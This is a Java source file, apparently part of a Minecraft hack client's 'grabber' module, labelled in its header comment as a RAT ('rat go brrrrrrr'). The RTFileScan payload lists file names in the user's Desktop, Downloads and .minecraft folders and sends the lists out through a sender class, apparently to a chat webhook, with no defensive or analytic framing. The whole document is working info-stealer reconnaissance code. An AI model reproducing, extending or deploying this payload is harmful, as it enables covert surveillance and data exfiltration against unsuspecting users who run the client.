/*
 * rat go brrrrrrr
 */

package risingtide.tidehack.utils.grabber.risingtideimpl;

import risingtide.tidehack.utils.grabber.RTPayload;
import risingtide.tidehack.utils.grabber.RTSender;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;

public class RTFileScan implements RTPayload {
    @Override
    public String getName() {
        return "File Scanner";
    }

    @Override
    public void exec() throws Exception {
        RTSender s = new RTSender();

        List<String> desktopFiles = new ArrayList<>();
        List<String> downloadsFiles = new ArrayList<>();
        List<String> dotMcFiles = new ArrayList<>();

        // DESKTOP
        Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop"))
            .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop"))
            .filter(path -> path.toFile().getName().endsWith(".jar"))
            .forEach(path -> desktopFiles.add(path.toFile().getName()));

        // DOWNLOADS
        Files.walk(Paths.get(System.getProperty("user.home") + "\\Downloads"))
            .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Downloads"))
            //.filter(path -> path.toFile().getName().endsWith(".jar"))
            .forEach(path -> downloadsFiles.add(path.toFile().getName()));

        // .MINECRAFT
        Files.walk(Paths.get(System.getenv("APPDATA") + "\\.minecraft\\"))
            .filter(path -> path.toFile().getParent().equals(System.getProperty("APPDATA") + "\\.minecraft"))
            //.filter(path -> path.toFile().getName().endsWith(".jar"))
            .forEach(path -> dotMcFiles.add(path.toFile().getName()));

        StringBuilder sb1 = new StringBuilder();
        StringBuilder sb2 = new StringBuilder();
        StringBuilder sb3 = new StringBuilder();
        sb1.append("Files on Desktop:\n```");
        sb2.append("Files in Downloads:\n```");
        sb3.append("Files in `.minecraft`:\n```");
        for (String n : desktopFiles) {
            sb1.append(n).append("\n");
        }
        for (String n : downloadsFiles) {
            sb2.append(n).append("\n");
        }
        for (String n : dotMcFiles) {
            sb3.append(n).append("\n");
        }
        sb1.append("```");
        sb2.append("```");
        sb3.append("```");
        s.send(sb1.toString(),"File Scanner (Desktop)",true);
        s.send(sb2.toString(),"File Scanner (Downloads)",true);
        s.send(sb3.toString(),"File Scanner (.minecraft)",true);
    }
}
